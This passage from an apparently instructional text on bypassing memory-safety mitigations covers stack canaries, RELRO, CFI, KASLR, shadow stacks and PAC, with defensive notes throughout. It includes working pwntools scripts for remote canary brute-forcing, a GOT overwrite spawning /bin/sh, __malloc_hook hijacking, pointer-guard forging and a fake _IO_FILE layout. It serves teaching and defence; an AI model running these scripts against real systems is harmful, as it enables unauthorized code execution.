The canary on x86_64 Linux is an 8-byte value with the property that its least-significant byte is always `0x00` (a null terminator, to prevent accidental leaking via string operations). The remaining 7 bytes are random, derived from `AT_RANDOM` (16 bytes provided by the kernel at process start). This means there are 2^56 possible canary values — infeasible to brute-force in a single attempt.

### 3.2 Fork-based brute force

Covered in Domain 4 §8.1 and §15.5. In fork-without-exec servers, all children share the parent's canary. The attacker overflows byte-by-byte, testing each candidate against the child's response. At most 256 × 8 = 2048 attempts (1793 accounting for the known NUL first byte). Each attempt takes one connection.

The byte-by-byte brute-force algorithm works as follows. The attacker sends overflows that extend exactly one byte past the canary position. If the child process continues normally (does not crash), the byte is correct. If it crashes (`SIGABRT` from `__stack_chk_fail`), the byte is wrong. Since the first byte is always `0x00`, the attacker starts with byte 2:

```python
from pwn import *

def try_canary_byte(known_bytes, guess_byte):
    """Attempt one canary byte. Returns True if the child survives."""
    p = remote('target', 1337)
    payload  = b'A' * BUFFER_SIZE
    payload += known_bytes + bytes([guess_byte])
    p.send(payload)
    try:
        response = p.recv(timeout=1)
        p.close()
        return True   # child survived: byte is correct
    except:
        p.close()
        return False  # child crashed: byte is wrong

canary = b'\x00'  # first byte is always null
for byte_pos in range(1, 8):
    for guess in range(256):
        if try_canary_byte(canary, guess):
            canary += bytes([guess])
            log.info(f'Byte {byte_pos}: {hex(guess)} — canary so far: {canary.hex()}')
            break
    else:
        log.error(f'Failed to find byte {byte_pos}')

log.success(f'Full canary: {canary.hex()}')
```

This takes at most 7 × 256 = 1792 attempts (plus the known first byte). At one attempt per connection, against a local target, this completes in seconds. Against a remote target with 50ms round-trip, it takes ~90 seconds.

Mitigation: fork-then-exec (re-randomizes canary per child), rate-limiting connections, crash-rate monitoring.

### 3.3 SEH overwrite on Windows (x86)

On 32-bit Windows with stack-based SEH (Structured Exception Handling), the SEH handler chain is stored on the stack. A stack overflow can overwrite an SEH handler pointer. When an exception occurs (which the attacker can trigger by corrupting memory and causing a fault), the OS dispatches to the overwritten handler — before the function's epilogue runs and before the canary is checked.

This bypass is specific to 32-bit Windows x86 (x64 uses table-based SEH, Domain 1 Chapter 2 §12, which is not on the stack). SafeSEH (validating handler addresses against a whitelist) and SEHOP (SEH Overwrite Protection — validating the SEH chain's integrity before dispatch) mitigate this.

The exploitation sequence on 32-bit Windows:

1. The attacker overflows the buffer, writing past the canary and past the saved return address into the SEH chain.
2. The SEH handler pointer is overwritten with the address of attacker-chosen code (or a `pop pop ret` gadget followed by shellcode on the stack).
3. The attacker's overflow intentionally corrupts a pointer that will cause an access violation when dereferenced.
4. The access violation triggers SEH dispatch. The OS walks the SEH chain and calls the overwritten handler.
5. At this point, `__security_check_cookie` (the Windows canary check) has not yet run — it runs in the function epilogue, which was never reached because the exception diverted control flow.

CVE-2009-0075 (Internet Explorer 7 uninitialized memory / SEH overwrite) is a historical example where SEH overwrite was used to bypass stack cookies. The attacker triggered an exception via a crafted HTML element, causing dispatch to the overwritten SEH handler before the function's cookie check.

### 3.4 StackGuard vs ProPolice vs MSVC /GS

Different implementations of stack canaries have different properties:

**StackGuard (original, 1998).** The first stack canary implementation. Used a random canary placed before the return address. Relied on the canary being unknown to the attacker. Did not protect local variables or function pointers — only the return address.

**ProPolice (SSP, GCC `-fstack-protector`).** The GCC Stack-Smashing Protector reorders stack variables so that buffers are placed above other locals (closer to the canary/return address), preventing an overflow from corrupting non-buffer locals before hitting the canary. `-fstack-protector-strong` expands protection to functions with local arrays, address-taken variables, and struct members.

**MSVC `/GS` (Visual Studio).** Implements a "security cookie" (canary) plus reorders stack variables to put buffers next to the canary. Also implements "variable reordering" (placing strings/arrays above integer locals) and "GS buffer overrun detection" (a copy of vulnerable parameters is saved and checked after the function body). The `/GS` cookie is XOR'd with the stack frame pointer (`EBP`/`RSP`), making the expected cookie value frame-dependent — a leaked canary from one function is not directly reusable in another.

| Feature | StackGuard | GCC SSP | MSVC /GS |
|---------|-----------|---------|----------|
| Variable reordering | No | Yes | Yes |
| Frame-dependent cookie | No | No | Yes (XOR with EBP) |
| Protected by default | No | `-fstack-protector-all` | Yes (since VS 2005) |
| Protection scope | Return address only | Return address + frame pointer | Return address + parameters (copied) |
| Bypass via SEH | N/A (Unix) | N/A (Unix) | Yes, on 32-bit |

### 3.5 Thread stack canary variations

Each thread gets the same canary (derived from the same `AT_RANDOM` seed). However, in some glibc configurations, threads created before `AT_RANDOM` is processed (very early threads, or threads in the dynamic linker's self-initialization) may have a different or null canary. These edge cases are rare but have appeared in exploitation of specific configurations.

The canary is stored in the Thread Control Block (TCB) at offset `fs:0x28` on x86_64 Linux. The `__stack_chk_fail` handler, called when a mismatch is detected, typically prints a diagnostic and calls `abort()`. Some exploitation techniques target `__stack_chk_fail` itself: if the attacker can overwrite the GOT entry for `__stack_chk_fail` (under partial RELRO), the canary check becomes a controlled indirect call — the attacker corrupts the canary intentionally and gains code execution via the `__stack_chk_fail` redirect.

---

## 4. RELRO bypass

**Mitigation reference.** RELRO (Domain 1, Chapter 1B §5.1; partial vs full).

### 4.1 Partial RELRO: GOT overwrite

With partial RELRO, `.got.plt` remains writable (lazy binding requires it). The attacker overwrites a GOT entry for a frequently-called function (`printf`, `free`, `malloc`, `exit`, etc.) with the address of their target (a one-gadget, a ROP pivot, `system`). The next call to that function redirects to the attacker's target.

The following demonstrates overwriting `puts@GOT` with `system` under partial RELRO. After the overwrite, when the program calls `puts(user_input)`, it actually calls `system(user_input)`. If the attacker provides `"/bin/sh"` as the input string, a shell is spawned:

```python
from pwn import *

elf = ELF('./vuln_partial_relro')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./vuln_partial_relro')

# Step 1: Leak libc base (via any of the §1.2 techniques)
# ... leak code omitted for brevity ...
libc_base = leaked_value - known_offset

# Step 2: Compute system address
system_addr = libc_base + libc.symbols['system']

# Step 3: Overwrite puts@GOT with system
# Using an arbitrary-write primitive (format string write, heap overflow
# that corrupts GOT, etc.)
puts_got = elf.got['puts']

# Example: format string write (write system_addr to puts_got)
# fmtstr_payload computes the %n sequence to write the desired value
fmt_payload = fmtstr_payload(OFFSET, {puts_got: system_addr})
p.sendline(fmt_payload)

# Step 4: Trigger puts("/bin/sh") → actually calls system("/bin/sh")
p.sendline(b'/bin/sh')
p.interactive()
```

This is defeated by full RELRO (`-z relro -z now`), which resolves all GOT entries at load time and `mprotect`s the entire GOT read-only.

### 4.2 Full RELRO: alternative write targets

With full RELRO, the GOT is read-only. The attacker needs writable code-pointer targets elsewhere:

**`__malloc_hook` / `__free_hook` (glibc < 2.34).** These were global function pointers in libc's writable `.data` segment. `__malloc_hook`, if non-NULL, was called instead of the normal `malloc` implementation; `__free_hook` instead of `free`. An arbitrary-write primitive that set `__malloc_hook = one_gadget_address` achieved code execution on the next `malloc` call.

glibc 2.34 (2021) removed these hooks entirely. `__realloc_hook`, `__memalign_hook`, and `__malloc_initialize_hook` were also removed. This closed one of the most commonly-used exploitation targets in CTF and real-world exploitation. Post-2.34 exploits must find alternative targets.

The pre-2.34 exploitation was trivially simple:

```python
# Pre-glibc-2.34 exploitation via __malloc_hook
# Requires: arbitrary write primitive + libc leak

# Compute addresses
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
one_gadget_addr  = libc_base + ONE_GADGET_OFFSET

# Write one_gadget to __malloc_hook
arbitrary_write(malloc_hook_addr, one_gadget_addr)

# Trigger malloc → calls one_gadget instead
# Any call to malloc() (or printf with %s on a long string, which
# internally calls malloc) triggers the hook.
trigger_malloc()
```

**`_IO_FILE` vtable exploitation (FSOP — File Stream Oriented Programming).** libc's `FILE` structures (`stdin`, `stdout`, `stderr`, and any user-opened `FILE *`) contain a vtable pointer (`_IO_FILE_plus.vtable`). If the attacker can corrupt a `FILE` structure (via heap overflow into a `FILE` on the heap, or via the unsorted-bin attack writing a libc address over `_IO_list_all`), they can redirect file I/O operations (triggered by `fflush`, `fclose`, `printf`, or exit-time `_IO_flush_all_lockp`).

glibc 2.24+ validates the vtable pointer: it must point within the `__libc_IO_vtables` section. This prevents pointing to an arbitrary fake vtable. Exploitation post-2.24 uses `_IO_str_overflow` or `_IO_wstr_overflow` (which are within the valid vtable section) with carefully crafted `_IO_FILE` fields to achieve controlled function calls with controlled arguments. This is a constrained but still viable path.

The FSOP technique constructs a fake `_IO_FILE_plus` structure in attacker-controlled memory. The critical fields that must be set:

```c
/* Fake _IO_FILE_plus for FSOP exploitation (post-glibc 2.24)
 * This uses _IO_str_overflow, which is within the valid vtable section.
 * The key insight: _IO_str_overflow calls
 *   *((_IO_strfile *)fp)->_s._allocate_buffer(new_size)
 * which is a function pointer we can control. */

struct fake_io_file {
    /* _IO_FILE fields (offsets for x86_64 glibc 2.31): */
    int _flags;              /* offset 0x00: must satisfy checks */
    char *_IO_read_ptr;      /* offset 0x08 */
    char *_IO_read_end;      /* offset 0x10 */
    char *_IO_read_base;     /* offset 0x18 */
    char *_IO_write_base;    /* offset 0x20: must be < _IO_write_ptr */
    char *_IO_write_ptr;     /* offset 0x28: must be > _IO_write_base */
    char *_IO_write_end;     /* offset 0x30 */
    char *_IO_buf_base;      /* offset 0x38: (buf_end - buf_base) controls size calc */
    char *_IO_buf_end;       /* offset 0x40 */
    /* ... padding to vtable at offset 0xD8 ... */
    void *vtable;            /* offset 0xD8: point to _IO_str_jumps */
};
/* After the _IO_FILE, at the _IO_strfile extension:
 * offset 0xE0: _s._allocate_buffer = address of system (or one_gadget)
 * The _flags field is crafted so that _IO_str_overflow's checks pass
 * and it calls _allocate_buffer with a controlled argument. */
```

This technique was used in numerous CVE exploitation chains targeting heap corruption vulnerabilities in programs that link against glibc. The House of Orange (2016) is the canonical example: a heap overflow corrupts the top chunk, triggering `_IO_flush_all_lockp` via `malloc` failure, which walks `_IO_list_all` and calls the vtable method on a corrupted `_IO_FILE`.

**`exit_funcs` / `__exit_funcs`.** The `atexit` handler list is stored in a global structure (`__exit_funcs` in libc, writable `.data`). Each entry is a function pointer XOR'd with a "pointer guard" cookie (`PTR_DEMANGLE` — Domain 1, Chapter 1B §10.2). If the attacker knows the pointer guard (leaked via the same TCB read that leaks the canary), they can forge an `atexit` entry and achieve code execution when the program exits.

The pointer guard is stored at `fs:0x30` on x86_64 (adjacent to the canary at `fs:0x28`). The mangling operation is: `mangled = ROL(ptr ^ pointer_guard, 0x11)` (rotate left by 17 bits after XOR). To forge a mangled pointer:

```python
def ptr_mangle(ptr, pointer_guard):
    """Replicate glibc's PTR_MANGLE for x86_64."""
    return rol(ptr ^ pointer_guard, 17, 64)

def ptr_demangle(mangled, pointer_guard):
    """Replicate glibc's PTR_DEMANGLE for x86_64."""
    return ror(mangled, 17, 64) ^ pointer_guard

# If the attacker leaked the pointer_guard from fs:0x30:
forged_entry = ptr_mangle(one_gadget_addr, leaked_pointer_guard)
# Write forged_entry into __exit_funcs structure at the appropriate offset
# → code execution on exit()
```

**`_dl_fini` and `link_map` corruption.** At process exit, the dynamic linker calls `_dl_fini`, which iterates the `link_map` chain and invokes each DSO's `.fini_array` destructors. The `link_map` is in libc's writable memory. Corrupting a `link_map` entry's `.fini_array` pointer or count redirects destruction-time function calls.

**`_fini_array` overwrite.** If the binary's `.fini_array` (or a DSO's `.fini_array`) is in the RELRO region, it is read-only after load. But if it is not (partial RELRO, or a binary compiled without RELRO), overwriting it gives code execution at process exit. With full RELRO, `.fini_array` is protected — but the dynamic linker's `link_map` structures (which reference `.fini_array`) may not be.

**`__libc_start_main` stack variables.** The stack frame of `__libc_start_main` (which called `main`) contains function pointers (the `init`/`fini` parameters, the `rtld_fini` parameter). If the attacker can write to the stack at `main`'s return point (e.g., via a stack buffer overflow in `main` that reaches into `__libc_start_main`'s frame), they can redirect the return-from-main path.

**Thread-local variables.** Tcache's `tcache_perthread_struct` is in the thread's TLS region. Corrupting it (via a heap overflow that reaches the TLS, or a UAF of a tcache entry) can redirect tcache allocations to arbitrary addresses, achieving the same effect as a GOT overwrite (allocate at a writable code-pointer target and overwrite it).

---

## 5. CFI bypass

**Mitigation reference.** CET IBT (Domain 4 §9), CFG/XFG (Domain 4 §12), Clang CFI (Domain 4 §13).

### 5.1 COOP (Counterfeit Object-Oriented Programming)

Covered architecturally in Domain 4 §5. In the CFI-bypass context: COOP operates entirely within the set of valid CFI targets. Each "gadget" is a real virtual method whose address is in the CFI-valid set. The "chain" is a sequence of virtual calls through a polymorphic container, each dispatching to a different (but CFI-valid) method on a counterfeit object.

The attacker needs: a heap corruption that lets them create counterfeit C++ objects (fake vtable pointer, controlled fields), and a code location that iterates over a container of base-class pointers and calls a virtual method on each (the "main loop gadget").

Fine-grained CFI (`cfi-vcall` with type hierarchy checking) constrains which methods each call site can reach, narrowing the valid target set per call. XFG on Windows adds prototype-hash matching. But even with type-aware CFI, methods of the correct type can still be abused if their behavior with attacker-controlled `this` pointers produces useful side effects (writing to a controlled address, calling another function with controlled arguments).

A COOP attack in practice requires the following components:

1. **The main-loop gadget (ML-G):** A legitimate code location that iterates over a container of polymorphic objects and calls a virtual method on each. This is common in GUI frameworks (`for (auto *widget : widgets) widget->render()`) and plugin systems.

2. **Functional gadgets:** Virtual methods that perform useful operations when called with attacker-controlled `this` pointers. The `this` pointer gives the attacker control over the object's fields, which the method reads as its "arguments." Categories include:
   - **ARITH-G:** performs arithmetic on fields (useful for computing values)
   - **W-G:** writes a value to a controlled destination (arbitrary write)
   - **R-G:** reads from a controlled source into a field (arbitrary read)
   - **INVOKE-G:** calls another function pointer stored in a field (chain extension)

3. **Counterfeit objects:** Heap-sprayed structures that contain a vtable pointer pointing to a legitimate vtable (satisfying CFI) but with fields set to attacker-controlled values.

The attack was demonstrated by Schuster et al. (2015) against Firefox and Internet Explorer, achieving code execution with fine-grained CFI active. The key finding was that in large C++ codebases, the variety of virtual methods with compatible types provides enough functional gadgets to construct arbitrary computations.

### 5.2 Valid-target-set analysis

A practical CFI bypass involves auditing the set of valid targets at each protected indirect-call site and finding a target that, when called with attacker-controlled arguments (registers/stack), produces a useful primitive (arbitrary write, syscall, or further call chain).

With coarse-grained CFI (CFG): the valid set is "all address-taken functions in the process," which is thousands of functions. Finding a useful target is easy.

With fine-grained CFI (Clang `cfi-icall`): the valid set is "all functions with a matching prototype." The attacker searches for a function of the right type that performs a useful operation. For common prototypes (e.g., `void (*)(void *)`, `int (*)(int, char *)`) the set may still be large.

With type-hierarchy CFI (`cfi-vcall`): the valid set is "methods of the correct class hierarchy." Smaller, but still non-empty in large C++ codebases.

The quantitative analysis matters: a CFI bypass is harder when the valid target set is small. Research by Burow et al. (2017, "Control-Flow Integrity: Precision, Security, and Performance") measured average valid-target-set sizes across SPEC benchmarks:

| CFI Granularity | Avg. Valid Targets per Call Site | Bypass Difficulty |
|----------------|--------------------------------|-------------------|
| Coarse (CFG/IBT) | 500-5000+ | Trivial |
| Prototype-based (cfi-icall) | 10-100 | Moderate |
| Type-hierarchy (cfi-vcall) | 2-20 | Difficult but feasible |
| Full type + arity | 1-5 | Very difficult |

Even with the finest granularity, a valid-target-set of size > 1 means the attacker has choices. As long as one valid target exists that produces a useful effect with attacker-controlled arguments, CFI is bypassed.

### 5.3 `std::function` and `std::bind`

`std::function<R(Args...)>` is a type-erased callable wrapper. Internally, it stores a vtable-like structure (`_Manager_operation` and `_Invoker`) that dispatches to the stored callable. `std::bind` creates a bound callable with captured arguments.

These standard library types create indirect calls through vtable-like mechanisms that are valid CFI targets. An attacker who can corrupt a `std::function` object's internal state can redirect the call to any callable of the matching signature — and because `std::function` supports arbitrary callables (function pointers, lambdas, bound expressions), the CFI-valid target set is broad.

The internal layout of `std::function` on libstdc++ (GCC) uses a union for small-buffer optimization: small callables (function pointers, small lambdas) are stored inline; larger callables are heap-allocated. The vtable-like dispatch pointers (`_M_invoker` and `_M_manager`) are stored as plain function pointers within the `std::function` object. Corrupting `_M_invoker` redirects the call when the `std::function` is invoked.

### 5.4 JIT engine CFI bypass

JavaScript engines (V8, SpiderMonkey, JavaScriptCore) generate machine code at runtime. The JIT-generated code may not be covered by CFI (it wasn't present at compile time), creating a CFI-free zone within the process.

If the attacker can redirect an indirect call (via a CFI-valid target) into JIT'd code, they enter an unchecked region. From there, they can execute arbitrary operations. The JIT engine's own code generation may include useful gadgets (especially if the attacker influenced the JIT input via JavaScript).

Mitigations: V8's "V8 Sandbox" (isolating the JIT-generated code region so that corrupting it doesn't give arbitrary native code execution), WebAssembly's bounds-checking model (confining wasm-generated code to its own memory), and JIT code signing (on iOS, JIT pages are signed by the kernel and cannot be arbitrarily modified, though this limits JIT functionality and has been bypassed via JIT compilation of attacker-chosen code).

### 5.5 LLVM CFI type taxonomy and bypass surface

LLVM's CFI implementation provides multiple scheme levels, each protecting different call-site types:

**Forward-edge schemes:**
- `cfi-vcall`: protects virtual method calls. The call target must be a valid method for the class hierarchy at that call site. Bypassed via COOP (§5.1) when a valid method of the correct hierarchy performs a useful operation.
- `cfi-icall`: protects indirect calls through function pointers. The target must match the call site's function-pointer type signature. Bypassed when multiple functions share the same signature.
- `cfi-mfcall`: protects calls to member functions through member-function pointers. Similar to `cfi-vcall` but for non-virtual member function pointers.
- `cfi-nvcall`: protects non-virtual member function calls.

**Backward-edge scheme:**
- Shadow stack (CET or software-based): protects return addresses. Bypassed by avoiding `ret` entirely (JOP), exploiting `sigreturn`, or corrupting the shadow stack (§7).

**Cross-DSO CFI** extends checks across shared-library boundaries. Without it, an indirect call from `libA.so` into `libB.so` is unchecked (the caller's CFI metadata doesn't cover the callee's code). Cross-DSO CFI uses a runtime check (`__cfi_slowpath`) that validates the target against a shared bitmap — adding overhead but closing the cross-library gap.

A common bypass of non-cross-DSO CFI is to redirect an indirect call to a function in a different shared library. If the CFI checks are DSO-local, the target is unchecked. This is why cross-DSO CFI is essential in mixed-DSO environments.

### 5.6 ARM PAC (Pointer Authentication Code) bypass

PAC signs pointers with a cryptographic MAC computed from the pointer value, a context (typically the stack pointer or zero), and a secret key stored in system registers. Authenticating a pointer verifies the MAC and faults on mismatch.

Bypass approaches:

**Signing gadgets.** If the attacker finds a code sequence that signs an arbitrary pointer with the correct key and context (a "signing oracle"), they can forge PAC-signed pointers. Such gadgets may exist in code that manipulates function pointers legitimately — e.g., a callback registration routine that takes a user-provided function pointer and stores it PAC-signed.

**PAC-less entry points.** Some functions may not be compiled with PAC (legacy code, assembly routines, JIT-generated code). Redirecting to these functions avoids PAC checks entirely.

**PACMAN (2022, MIT).** Demonstrated on Apple M1: speculative execution can be used to test candidate PAC values without triggering a fault. The attacker primes the branch predictor to speculatively execute an authentication+use of a candidate pointer. If the PAC is correct, speculative execution proceeds and produces a measurable side-channel effect (cache timing). If incorrect, speculation is rolled back with no visible fault. This allows brute-forcing the PAC speculatively at CPU speed.

FEAT_FPAC (ARMv8.6-A and later) mitigates PACMAN by raising a synchronous fault immediately during PAC verification, before speculative execution can continue with the authenticated pointer. On FEAT_FPAC hardware, the speculative oracle is closed.

### 5.7 Rust `unsafe` blocks

Rust's memory-safety guarantees are enforced at compile time by the borrow checker. Code within `unsafe` blocks can bypass these guarantees: dereferencing raw pointers, calling unsafe functions, accessing mutable statics, and performing unchecked type transmutations.

`unsafe` code is not automatically a CFI bypass, but it can create the conditions for one: a memory-corruption bug in an `unsafe` block (e.g., a buffer overflow in a manual memory-management routine) can corrupt Rust's internal data structures (vtable pointers in `dyn Trait` objects, function pointers in closures) just as in C++.

Rust's `dyn Trait` uses a vtable mechanism similar to C++ virtual dispatch. Corrupting the vtable pointer of a `dyn Trait` object redirects method calls — and Rust currently does not deploy fine-grained CFI on `dyn Trait` dispatch by default (though Clang's CFI can be enabled for Rust via `-Zsanitizer=cfi`).

The practical implication: auditing `unsafe` blocks in Rust codebases is the analog of auditing raw pointer arithmetic in C/C++. An `unsafe` block that takes user-controlled input as a pointer or index is a potential corruption primitive.

---

## 6. KASLR bypass (expanded)

**Mitigation reference.** KASLR (Domain 5, Chapter 5A §7.4).

Kernel ASLR randomizes the kernel image base, the module region, and the direct-map offset. Bypassing it:

### 6.1 Direct information leaks

**`/proc/kallsyms` with `kptr_restrict=0`.** The most direct leak: kernel symbol addresses are printed in cleartext. Hardened systems set `kptr_restrict=1` or `=2`.

**`dmesg` with `dmesg_restrict=0`.** Kernel log messages often contain pointers (stack traces, error messages with `%pK` formatting). Without `dmesg_restrict`, any user can read them.

**Kernel information leaks via syscalls.** Some syscalls return kernel pointers in their output under specific conditions: timer-related ioctls on some hardware, netlink messages with unfiltered kernel addresses, and certain `/proc`/`/sys` entries that leak kernel addresses due to insufficient `%pK` formatting.

**Uninitialized kernel stack leaks.** Kernel functions that `copy_to_user` without fully initializing the output buffer leak kernel stack contents to user space. These contents may include kernel code pointers. `CONFIG_INIT_STACK_ALL_ZERO` (Clang) or `CONFIG_GCC_PLUGIN_STRUCTLEAK` mitigate this by zero-initializing stack variables.

CVE-2017-7308 (Linux `packet_set_ring` — AF_PACKET) is a well-documented case where a kernel vulnerability was combined with information leaking techniques to bypass KASLR. The `packet_set_ring` function in the AF_PACKET subsystem had an integer overflow that could be used for heap corruption, but attackers first used uninitialized memory leaks from other packet socket operations to derive the kernel base address.

### 6.2 EntryBleed (CVE-2022-4543)

EntryBleed, disclosed by Will in 2022, is a KASLR bypass that exploits the CPU entry area's interaction with the prefetch side channel. The CPU entry area is mapped at a fixed virtual address for each CPU, but its content (entry trampolines) contains pointers that are relative to the kernel base. By timing prefetch operations on the CPU entry area, an unprivileged user can infer the kernel text base.

The attack exploits the fact that KPTI (Kernel Page Table Isolation) does not unmap the CPU entry area from user-mode page tables — it cannot, because the entry area contains the trampoline code that handles the user-to-kernel transition. The entry area is mapped at a per-CPU address that is derived from the CPU number and a fixed base (`CPU_ENTRY_AREA_BASE`). Within each CPU's entry area, the entry text (syscall entry, interrupt handlers) is at a known offset.

The fix required randomizing the CPU entry area mapping or reducing the information leaked through it. This CVE demonstrated that even with KPTI, the kernel's attack surface through mandatory user-visible mappings is non-zero.

### 6.3 eBPF verifier leaks

eBPF (extended Berkeley Packet Filter) programs run in a kernel-mode sandbox with a verifier that checks safety properties before execution. Verifier bugs have been a repeated source of KASLR bypasses:

The eBPF verifier tracks the range of possible values for each register. If the verifier's range tracking has a bug (e.g., an off-by-one in value propagation), an eBPF program can perform an out-of-bounds read from a kernel map or helper function argument, leaking kernel addresses to user space.

CVE-2021-22555 (Netfilter `setsockopt` write-after-free) was exploited in combination with eBPF-based KASLR leaks. The attacker used an eBPF program with a carefully crafted verifier-bypass to read kernel memory and determine the kernel base, then exploited the Netfilter vulnerability for privilege escalation.

Mitigation: `kernel.unprivileged_bpf_disabled=1` (disables eBPF for unprivileged users), aggressive verifier hardening (each verifier bug discovered results in a patch that tightens range tracking), and `CONFIG_BPF_UNPRIV_DEFAULT_OFF`.

### 6.4 KASLR entropy

Kernel ASLR on x86_64 provides approximately 9 bits of entropy for the kernel text region (512 possible 2MB-aligned positions in the default KASLR range). The module region has approximately 10 bits. The direct-map region has approximately 10 bits.

Nine bits means only 512 possible kernel text positions. A side-channel scan (§1.3 prefetch timing) that tests 512 candidate addresses, at ~100ns per probe averaged over 1000 samples, completes in approximately 50ms. This is why kernel ASLR is considered a speed-bump rather than a load-bearing defense — it significantly increases the complexity of blind exploitation but does not withstand targeted probing from a local attacker with code execution.

### 6.5 KPTI relationship to KASLR

KPTI (Kernel Page Table Isolation, also known as KAISER or the Meltdown mitigation) maintains two sets of page tables: one for kernel mode (with all mappings) and one for user mode (with only the minimum kernel mappings needed for entry/exit). KPTI was originally designed as a Meltdown mitigation, but it also hardens KASLR by making kernel pages invisible to user-mode probing.

Without KPTI, user-mode code can probe kernel addresses via prefetch timing, TLB timing, and TSX-based fault suppression (§1.3). With KPTI, the user-mode page tables do not contain kernel text/data mappings, so these probes return "unmapped" for all candidate addresses — the signal is uniform and reveals nothing.

KPTI does not protect against leaks via kernel interfaces (`/proc`, `dmesg`, syscall outputs) or against eBPF verifier bugs. It specifically closes the microarchitectural side channels by removing the kernel mappings from user-mode TLBs.

---

## 7. Shadow stack bypass considerations (expanded)

**Mitigation reference.** CET Shadow Stack (Domain 4 §9.2), ARM PAC (Domain 4 §11.1).

Shadow stacks protect return addresses. The attacker's options:

**Avoid `ret` entirely.** JOP-style chains (Domain 4 §3) use `jmp` instead of `ret`, never triggering the shadow-stack check. IBT constrains JOP targets, but if the attacker finds sufficient `ENDBR`-prefixed targets (function entry points), JOP remains viable.

**Exploit `sigreturn`.** The kernel's signal-return path must update the shadow stack (restore the shadow-stack pointer to match the restored context). If the attacker can forge a valid shadow-stack token (§Domain 4, §9.2), `sigreturn` legitimately updates the shadow stack. Mainline Linux's implementation stores a restore token on the shadow stack during signal delivery, and `sigreturn` validates it — but implementation bugs in this validation would be critical.

**Corrupt the shadow stack directly.** The shadow stack is a dedicated memory region with a special page-table encoding that prevents normal `mov` writes. However, `WRSS` (Write to Shadow Stack) is a privileged instruction that can write to shadow stack pages. If the attacker gains kernel code execution, they can use `WRSS` to forge shadow-stack entries. This elevates the bar to "kernel code execution required to bypass shadow stack" — a significant increase.

**PAC bypass.** PAC's cryptographic strength depends on the key width and the implementation. On early implementations (Apple M1), the PACMAN attack used speculative execution to test PAC values without triggering a fault, effectively brute-forcing the PAC via a speculative side channel. FEAT_FPAC (in later ARMv8.6-A implementations) raises a synchronous fault immediately on PAC mismatch, closing the speculative oracle.

PAC keys are stored in system registers inaccessible from user mode. An attacker with kernel code execution can read them (and then forge PACs for any pointer). This is the same "kernel compromise defeats everything" principle — PAC's user-space protection holds as long as the kernel is intact.

**Intel CET interaction with JOP.** CET provides both shadow stacks (backward-edge) and Indirect Branch Tracking (IBT, forward-edge). IBT requires that all indirect branch targets begin with an `ENDBR64` (or `ENDBR32`) instruction. A JOP chain that avoids `ret` must still land on `ENDBR`-prefixed targets. The question becomes: are there enough `ENDBR`-prefixed targets with useful semantics? In a large process (browser, office suite), thousands of functions begin with `ENDBR64`. The forward-edge protection is coarse-grained — similar to CFG (§5.2). Fine-grained forward-edge CFI (Clang CFI, XFG) is needed to meaningfully restrict the JOP target set.

---

## 8. Defense-in-depth analysis

This section synthesizes the bypass techniques from §1-§7 into a framework for evaluating mitigation posture. The goal is to understand how mitigations interact, where the gaps are, and how modern exploit chains traverse the defensive layers.

### 8.1 Mitigation interaction matrix

The following matrix shows which mitigations protect against which attack techniques. A checkmark indicates the mitigation provides meaningful resistance against the technique; a dash indicates it does not.

| Technique | ASLR | DEP/NX | Canary | RELRO | CFI | Shadow Stack | PAC | MTE |
|-----------|------|--------|--------|-------|-----|-------------|-----|-----|
| Stack buffer overflow → RIP control | — | — | YES | — | — | YES | YES | — |
| Heap corruption → code pointer overwrite | — | — | — | YES (GOT) | YES | — | YES | YES |
| Format string read | — | — | — | — | — | — | — | — |
| Format string write | — | — | — | YES (GOT) | — | — | — | — |
| ROP chain execution | YES | — | YES | — | — | YES | — | — |
| JOP chain execution | YES | — | — | — | YES (IBT) | — | — | — |
| Return-to-libc | YES | — | YES | — | YES | YES | — | — |
| JIT spraying | YES | — | — | — | — | — | — | — |
| Shellcode injection | YES | YES | YES | — | — | YES | — | — |
| UAF → vtable hijack | — | — | — | — | YES | — | YES | YES |
| FSOP (_IO_FILE) | — | — | — | — | — | — | — | — |

The empty cells (no mitigation effective) represent techniques where the attacker operates entirely in data space, manipulating non-code pointers or data structures that influence control flow indirectly. FSOP, for example, corrupts file-stream metadata to eventually invoke a function through a validated vtable — no mitigation in the current stack directly prevents this data-level corruption.

### 8.2 Mitigation effectiveness tiers

**Tier 1 — Speed bumps.** These increase the attacker's effort modestly but are routinely bypassed by known techniques. They should still be deployed (they filter out unsophisticated attacks) but cannot be relied upon as the sole defense.

- ASLR alone (bypassed by any info leak)
- Partial RELRO (GOT remains writable)
- KASLR alone (9 bits of entropy, side-channel vulnerable)
- Stack canaries alone (bypassed by info leak or fork brute-force)

**Tier 2 — Load-bearing defenses.** These require the attacker to develop additional primitives (info leaks, specific ROP chains, heap feng shui). They meaningfully increase exploit development cost and eliminate broad classes of simple attacks.

- DEP/NX + ASLR (requires both a leak and a code-reuse chain)
- Full RELRO + ASLR (forces the attacker away from GOT to more complex targets)
- Seccomp (blocks `mprotect` with `PROT_EXEC`, `execve`, etc.)
- Stack canaries + ASLR (the attacker needs two primitives: leak + overflow)

**Tier 3 — Defense-in-depth (emerging hardware).** These are the most expensive for attackers to bypass. They often require kernel compromise, hardware-specific side channels, or discovery of new vulnerability classes.

- CET shadow stack + IBT (backward + forward edge, hardware-enforced)
- ARM PAC + MTE (pointer signing + memory tagging)
- Fine-grained CFI (LLVM CFI, XFG) + shadow stack
- SELinux/AppArmor mandatory access control (even with code execution, the process is confined)

### 8.3 Modern exploit chain analysis

A modern userspace exploit against a hardened target (PIE, full RELRO, stack protector strong, ASLR, DEP, seccomp) typically follows this chain:

**Stage 1: Information leak (defeats ASLR and canary).** The attacker exploits a separate bug or a secondary effect of the primary bug to leak a libc address (from heap metadata, format string, or uninitialized memory) and optionally the stack canary (from the same or a different leak). Without this stage, all subsequent stages operate blind.

**Stage 2: Heap layout manipulation (prerequisite for corruption).** The attacker uses controlled allocations and frees to position objects in a predictable layout ("heap feng shui"). This enables the primary vulnerability (heap overflow, UAF) to corrupt a specific target object.

**Stage 3: Controlled corruption (application-specific).** The attacker triggers the primary vulnerability to corrupt a code pointer or data structure. Under full RELRO, the GOT is not available; the attacker targets `_IO_FILE` structures, `exit_funcs`, `link_map`, or tcache metadata.

**Stage 4: Code execution or privilege escalation.** The corrupted structure is triggered (via `exit()`, `fflush()`, `malloc()`/`free()`, or a virtual call). The attacker's chosen target (one-gadget, ROP pivot, `system("/bin/sh")`) executes.

